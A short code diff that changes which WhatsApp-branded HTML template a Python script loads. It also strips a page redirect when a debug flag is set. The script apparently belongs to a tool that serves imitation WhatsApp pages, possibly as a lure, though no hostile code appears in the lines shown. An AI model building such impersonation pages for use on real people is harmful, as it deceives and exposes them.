@@ -33,7 +33,7 @@ else:
         utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
         exit()
 
-with open('template/whatsapp/index_temp.html', 'r') as index_temp:
+with open('template/whatsapp/index_modern.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
         code = code.replace('window.location = "https:" + restOfUrl;', '')
